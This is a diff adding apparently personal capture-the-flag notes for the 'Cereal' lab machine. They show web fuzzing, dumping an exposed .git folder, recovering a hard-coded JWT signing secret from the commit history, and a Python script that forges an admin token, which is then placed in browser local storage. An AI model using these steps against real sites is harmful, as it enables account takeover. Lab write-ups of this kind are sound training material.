@@ -1,0 +1,114 @@
+
+
+
+
+at https://source.cereal.htb/
+
+Server Error in '/' Application.
+Compilation Error
+Description: An error occurred during the compilation of a resource required to service this request. Please review the following specific error details and modify your source code appropriately.
+
+Compiler Error Message: CS1519: Invalid token '>' in class, struct, or interface member declaration
+
+Source Error:
+
+
+Line 1:  <% @Page Language="C#" %>
+Line 2:  
+Line 3:  <script runat="server">>
+Line 4:  
+Line 5:  
+
+
+Source File: c:\inetpub\source\default.aspx    Line: 3 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u https://source.cereal.htb/FUZZ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://source.cereal.htb/FUZZ
+Total requests: 37050
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000191:   500        125 L    476 W      9727 Ch     "default.aspx"                                      
+000000217:   500        127 L    496 W      10090 Ch    "Default.aspx"                                      
+000000379:   500        127 L    496 W      10090 Ch    "."                                                 
+000001935:   301        1 L      10 W       154 Ch      ".git"                                              
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# git-dumper https://source.cereal.htb/ ./src
+[-] Testing https://source.cereal.htb/.git/HEAD [200]
+[-] Testing https://source.cereal.htb/.git/ [403]
+[-] Fetching common files
+...
+
+
+we notice the site is using jwt tokens
+
+┌──(root㉿kali)-[/home/kali/src/Services]
+└─# git log -p                                                
+...
+                 // authentication successful so generate jwt token
+                 var tokenHandler = new JwtSecurityTokenHandler();
+-                var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
++                var key = Encoding.ASCII.GetBytes("****");
+                 var tokenDescriptor = new SecurityTokenDescriptor
+
+
+
+import jwt
+
+key = "secretlhfIH&FY*#oysuflkhskjfhefesf"
+payload = {
+    "unique_name": "1",  # admin userId
+    "nbf": 1621844924,   # not before (optional)
+    "exp": 1622449724,   # expiry (optional)
+    "iat": 1621844924    # issued at (optional)
+}
+token = jwt.encode(payload, key, algorithm="HS256")
+print(token)
+
+
+ends up looking like 
+
+{"userid" : "1", "username" : "admin", "token" :
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjE4NDQ5MjQsI
+mV4cCI6MTYyMjQ0OTcyNCwiaWF0IjoxNjIxODQ0OTI0fQ.CpORKrMxIdStpxegLX6F9k37g9-
+2OkpVBms459264rM"}
+
+
+we go to cereal.htb
+
+enter under Local Storage
+
+currentUser : {"userid" : "1", "username" : "admin", "token" :
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjE4NDQ5MjQsI
+mV4cCI6MTYyMjQ0OTcyNCwiaWF0IjoxNjIxODQ0OTI0fQ.CpORKrMxIdStpxegLX6F9k37g9-
+2OkpVBms459264rM"}
+
+
+refresh and we are logged in
+
+
+
+
+
+
+
+
+
+
+
+
